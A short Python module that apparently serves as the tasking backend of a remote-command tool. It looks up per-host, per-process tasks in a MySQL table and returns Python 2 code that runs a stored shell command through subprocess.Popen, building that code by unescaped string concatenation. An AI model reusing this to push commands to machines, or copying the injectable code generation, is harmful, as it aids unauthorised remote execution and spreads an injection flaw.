import pymysql
#from core.config import *
from config import *


class Tasking(object):

    def __init__(self):
        # tries to open the database connection
        try:
            self.connection = pymysql.connect(host="localhost",
                                              port=3306,
                                              user=username,
                                              passwd=password,
                                              db=database,
                                              autocommit=True)

        except Exception:
            raise

    def close_database_connection(self):
        """
        DESCRIPTION:
            This function closes the database connection
        """
        if self.connection.open:
            self.connection.close()

    def has_tasking(self, hostname, process_id):
        """
        DESCRIPTION:
            This function queries the "tasks" table for tasking

        ARGUMENTS:
            str: hostname
            str: process_id

        RETURNS:
            bool: true if tasks, false if no tasks
        """
        try:
            with self.connection.cursor() as cursor:
                statement = "SELECT * FROM tasks WHERE hostname = %s AND process_id = %s LIMIT 1"
                cursor.execute(statement, (hostname, process_id))

                # if tasks
                if cursor.rowcount == 1:
                    return True

                # else no tasks
                else:
                    return False

        except Exception:
            raise

    def generate_command_code(self, command):
        """
        DESCRIPTION:
            This function generates python 2.x code to execute a shell command

        ARGUMENTS:
            str: command

        RETURNS:
            str: code
        """
        code = "import subprocess; subprocess.Popen('" + command + "', stdout=subprocess.PIPE, stderr=subprocess.PIPE)"
        return code

    def get_tasking(self, hostname, process_id):
        """
        DESCRIPTION:
            This function gets tasking from the "tasks" table

        ARGUMENTS:
            str: hostname
            str: process_id

        RETURNS:

        """
        try:
            with self.connection.cursor() as cursor:
                statement = "SELECT task_action, task_secondary FROM tasks WHERE hostname = %s AND process_id = %s LIMIT 1"
                cursor.execute(statement, (hostname, process_id))
                result = cursor.fetchone()

                if result[0] == "command":
                    return self.generate_command_code(result[1])

        except Exception:
            raise

t = Tasking()
print(t.has_tasking("MINT-TESTING", "90735"))
print(t.get_tasking("MINT-TESTING", "90735"))
